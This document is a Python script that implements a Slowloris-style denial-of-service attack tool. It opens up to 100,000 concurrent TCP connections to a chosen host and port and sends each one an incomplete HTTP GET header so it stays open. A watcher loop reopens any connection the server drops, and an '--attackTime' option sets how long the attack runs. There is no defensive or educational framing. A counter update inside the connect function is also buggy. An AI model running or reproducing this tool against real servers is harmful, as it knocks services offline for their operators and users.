import socket
import logging
import argparse
import sys

parser = argparse.ArgumentParser(description="Your tool’s description")
parser.add_argument(
    "--host", "-H",
    default="localhost",
    help="Target hostname or IP"
)
parser.add_argument(
    "--port", "-p",
    type=int,
    default=80,
    help="Target port (default: 80)"
)
parser.add_argument(
    "--sockets", "-s",
    type=int,
    default=200000,
    help="Number of parallel sockets to open"
)

parser.add_argument(
                    "--attackTime",default=1000,
                    type=int, 
                    help="Time in seconds to keep the attack running")

args = parser.parse_args()


HOST, PORT        = args.host, args.port
SOCKET_COUNT      = 100000

def validate_address(host: str, port: int, timeout: float = 5.0):
    """
    1) Checks DNS resolution of host.
    2) Tries a single TCP connect to host:port.
    Exits with an error message if either step fails.
    """
    try:
        addrs = socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM)
    except socket.gaierror as e:
        print(f"[!] Hostname lookup failed for {host!r}: {e}")
        sys.exit(1)

    for family, socktype, proto, _, sockaddr in addrs:
        try:
            s = socket.socket(family, socktype, proto)
            s.settimeout(timeout)
            s.connect(sockaddr)
            s.close()
            print(f"[+] Successfully connected to {host}:{port}")
            return  # success!
        except Exception:
            continue

    print(f"[!] Unable to connect to {host}:{port} within {timeout}s.")
    sys.exit(1)



num_sockets = 100000
sockets = []

import socket, selectors, threading, time, random, queue



sel      = selectors.DefaultSelector()   # uses epoll/kqueue/Select automatically
sockets  = {}        # fileno ➜ socket object
todo_q   = queue.Queue()  # commands for watcher ➜ main (optional)
i=0
def create_socket(_=None):                    # underscore arg matches ThreadPool API
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((HOST, PORT))               # blocking; cheap in a thread
        s.setblocking(False)
        req = f"GET / HTTP/1.1\r\nHost: {HOST}\r\n".encode()
        s.sendall(req)
        sel.register(s, selectors.EVENT_READ)
        sockets[s.fileno()] = s
        print(f"Socket {i} created")
        i+= 1
        return s
    except Exception as e:
        logging.debug("connect failed: %s", e)
        return None
import concurrent.futures

MAX_WORKERS   = 500        # or args.workers

def replenish_sockets():
    """Bring the global pool back up to TARGET_COUNT using a threadpool."""
    deficit = SOCKET_COUNT - len(sockets)
    if deficit <= 0:
        return
    logging.info("Need %d new sockets → spinning up pool…", deficit)

    # Use threads so all TCP handshakes run concurrently
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        for sock in pool.map(create_socket, range(deficit)):
            if not sock:
                # Optional: queue a retry later if many fail
                continue


def watcher():
    """Blocks until a socket is readable/HUP → recreate it instantly."""
    while True:
        events = sel.select()            # BLOCKS until something happens
        for key, mask in events:
            fd = key.fd
            sock = sockets.pop(fd, None)
            if sock:
                sel.unregister(sock)
                sock.close()
        try:
            replenish_sockets()  # Replenish sockets after handling events
        except KeyboardInterrupt:
            logging.info("Keyboard interrupt received, stopping attack")
            for sock in sockets.values():
                sock.close()
            return


# --- Bootstrap ----------------------------------------------------------

validate_address(HOST, PORT)
replenish_sockets()

watcher()# Fill the pool to start

   






        
                
